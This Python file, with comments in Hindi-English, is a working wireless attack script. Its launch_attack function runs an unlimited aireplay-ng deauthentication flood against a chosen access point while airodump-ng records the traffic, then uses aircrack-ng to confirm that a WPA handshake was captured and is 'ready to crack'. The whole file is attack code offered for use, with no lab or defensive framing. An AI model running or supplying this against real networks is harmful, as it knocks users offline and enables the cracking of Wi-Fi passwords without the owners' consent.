import subprocess
import os
import time

def launch_attack(bssid, channel, interface='wlan0mon'):
    try:
        clean_channel = str(channel).split(',')[0]
        
        # 1. Background processes kill karo
        subprocess.run(['pkill', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['pkill', 'aireplay-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        capture_file = "/tmp/awb_attack"
        
        # Purani files delete karo
        for ext in ["-01.cap", "-01.csv", "-01.kismet.csv", "-01.netxml"]:
            if os.path.exists(capture_file + ext):
                try:
                    os.remove(capture_file + ext)
                except:
                    pass
            
        # 2. airodump-ng ko start karo aur uski errors ko ek file mein save karo
        err_log = open("/tmp/awb_err.log", "w")
        airodump = subprocess.Popen(['airodump-ng', '-c', clean_channel, '--bssid', bssid, '-w', capture_file, '--ignore-negative-one', interface], 
                                    stdout=subprocess.DEVNULL, stderr=err_log)
        
        time.sleep(5) # 5 seconds tak usko chalne do
        
        # Agar airodump 5 seconds mein hi mar jaye, toh error read karo
        if airodump.poll() is not None:
            err_log.close()
            with open("/tmp/awb_err.log", "r") as f:
                error_text = f.read()
            return {"status": "error", "message": f"airodump-ng failed to start. Reason: {error_text}"}
        
        # 3. Infinite Deauth Attack start karo
        aireplay = subprocess.Popen(['aireplay-ng', '-0', '0', '-a', bssid, '--ignore-negative-one', interface], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # 60 seconds tak capture hone do
        time.sleep(60)
        
        # Band karo
        aireplay.terminate()
        airodump.terminate()
        airodump.wait()
        err_log.close()
        time.sleep(3)
        
        cap_file_path = capture_file + "-01.cap"
        if not os.path.exists(cap_file_path):
            return {"status": "error", "message": "Capture file not generated. Unknown error."}
        
        # 4. Handshake Verify Karna
        verify = subprocess.run(['aircrack-ng', cap_file_path], capture_output=True, text=True)
        output = verify.stdout
        
        if "1 handshake" in output:
            return {"status": "success", "message": "VERIFIED! Handshake captured successfully! Ready to crack."}
        else:
            return {"status": "error", "message": "Attack finished but NO HANDSHAKE captured. Try again."}
            
    except Exception as e:
        return {"status": "error", "message": str(e)}